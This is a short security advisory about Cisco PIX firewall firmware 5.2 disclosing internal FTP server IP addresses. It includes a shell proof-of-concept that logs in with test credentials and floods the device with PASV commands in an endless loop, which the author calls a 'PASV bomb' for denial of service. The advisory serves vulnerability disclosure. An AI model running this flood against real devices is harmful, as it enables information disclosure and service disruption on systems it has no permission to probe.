source: http://www.securityfocus.com/bid/1877/info

The Cisco PIX is a popular firewall network device. 

It is possible to configure the PIX so that it hides the IP address of internal ftp servers from clients connecting to it. By sending a number of requests to enter passive ftp mode (PASV) during an ftp session, the IP address will eventually be disclosed. It is not known what exactly causes this condition.

This has been verified on versions 5.2(4) and 5.2(2) of the PIX firmware and probably affects other versions.


# sent by: Fabio Pietrosanti (naif) <naif@inet.it>
# try to dos pix using PASV bomb

echo "USER ftptest99"
sleep 2
echo PASS ftptest99
sleep 2
echo SYST
while true
       do

            echo PASV
            sleep 1
            echo PASV
            echo PASV
            sleep 1
            echo PASV
            echo PASV
            sleep 1
            echo PASV
           echo PASV
            sleep 1
done